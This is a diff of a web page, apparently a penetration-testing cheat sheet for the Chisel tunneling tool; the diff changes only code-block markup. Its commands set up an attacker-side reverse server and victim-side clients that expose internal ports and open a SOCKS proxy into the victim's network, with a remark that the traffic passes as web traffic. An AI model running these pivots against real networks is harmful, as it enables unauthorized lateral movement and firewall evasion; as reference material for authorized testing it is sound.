@@ -126,52 +126,52 @@
 <p><strong>Chisel</strong> is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. It is the modern alternative to SSH tunneling because it's a single binary and works over HTTP (firewall friendly).</p>
 <h2>Top 10 Useful Commands</h2>
 <h3>1. Server Mode (Attacker)</h3>
-<div class="codehilite"><pre><span></span><code>chisel<span class="w"> </span>server<span class="w"> </span>-p<span class="w"> </span><span class="m">8000</span><span class="w"> </span>--reverse
-</code></pre></div>
+<pre class="codehilite"><code class="language-bash">chisel server -p 8000 --reverse
+</code></pre>
 
 <p><strong>Explanation:</strong> Listen on 8000, allow reverse tunnels (<code>--reverse</code>).</p>
 <h3>2. Client Mode (Victim) - Reverse Proxy</h3>
-<div class="codehilite"><pre><span></span><code>chisel<span class="w"> </span>client<span class="w"> </span><span class="m">10</span>.10.10.10:8000<span class="w"> </span>R:80:127.0.0.1:80
-</code></pre></div>
+<pre class="codehilite"><code class="language-bash">chisel client 10.10.10.10:8000 R:80:127.0.0.1:80
+</code></pre>
 
 <p><strong>Explanation:</strong> "Make my local port 80 appear on the server's port 80". Exposes an internal service to the attacker.</p>
 <h3>3. SOCKS5 Proxy (The Magic Command)</h3>
-<div class="codehilite"><pre><span></span><code>chisel<span class="w"> </span>client<span class="w"> </span><span class="m">10</span>.10.10.10:8000<span class="w"> </span>R:socks
-</code></pre></div>
+<pre class="codehilite"><code class="language-bash">chisel client 10.10.10.10:8000 R:socks
+</code></pre>
 
 <p><strong>Explanation:</strong> Connect to server and open a SOCKS proxy on the server. Attacker can now use Proxychains to browse the Victim's network.</p>
 <h3>4. Port Forwarding (Local)</h3>
-<div class="codehilite"><pre><span></span><code>chisel<span class="w"> </span>client<span class="w"> </span><span class="m">10</span>.10.10.10:8000<span class="w"> </span><span class="m">9000</span>:google.com:80
-</code></pre></div>
+<pre class="codehilite"><code class="language-bash">chisel client 10.10.10.10:8000 9000:google.com:80
+</code></pre>
 
 <p><strong>Explanation:</strong> Forward local 9000 to remote google:80 via the tunnel.</p>
 <h3>5. Authentication</h3>
-<div class="codehilite"><pre><span></span><code>chisel<span class="w"> </span>server<span class="w"> </span>--auth<span class="w"> </span><span class="s2">&quot;user:pass&quot;</span>
-</code></pre></div>
+<pre class="codehilite"><code class="language-bash">chisel server --auth &quot;user:pass&quot;
+</code></pre>
 
 <p><strong>Explanation:</strong> Require password for tunnels.</p>
 <h3>6. Keepalive</h3>
-<div class="codehilite"><pre><span></span><code>chisel<span class="w"> </span>client<span class="w"> </span>...<span class="w"> </span>--keepalive<span class="w"> </span>10s
-</code></pre></div>
+<pre class="codehilite"><code class="language-bash">chisel client ... --keepalive 10s
+</code></pre>
 
 <p><strong>Explanation:</strong> Send ping to keep connection open.</p>
 <h3>7. Verbose</h3>
-<div class="codehilite"><pre><span></span><code>chisel<span class="w"> </span>server<span class="w"> </span>-v
-</code></pre></div>
+<pre class="codehilite"><code class="language-bash">chisel server -v
+</code></pre>
 
 <p><strong>Explanation:</strong> Debug logs.</p>
 <h3>8. Fingerprint Hide</h3>
-<div class="codehilite"><pre><span></span><code><span class="c1"># (Chisel uses websockets/http, looks like web traffic)</span>
-</code></pre></div>
+<pre class="codehilite"><code class="language-bash"># (Chisel uses websockets/http, looks like web traffic)
+</code></pre>
 
 <h3>9. Forward UDP</h3>
-<div class="codehilite"><pre><span></span><code>chisel<span class="w"> </span>client<span class="w"> </span>...<span class="w"> </span><span class="m">53</span>:1.1.1.1:53/udp
-</code></pre></div>
+<pre class="codehilite"><code class="language-bash">chisel client ... 53:1.1.1.1:53/udp
+</code></pre>
 
 <p><strong>Explanation:</strong> Support UDP tunneling.</p>
 <h3>10. Help</h3>
-<div class="codehilite"><pre><span></span><code>chisel<span class="w"> </span>--help
-</code></pre></div>
+<pre class="codehilite"><code class="language-bash">chisel --help
+</code></pre>
 
 <h2>The Most Powerful Command</h2>
 <p><strong>Server (Attacker):</strong> <code>chisel server -p 8000 --reverse</code><br />
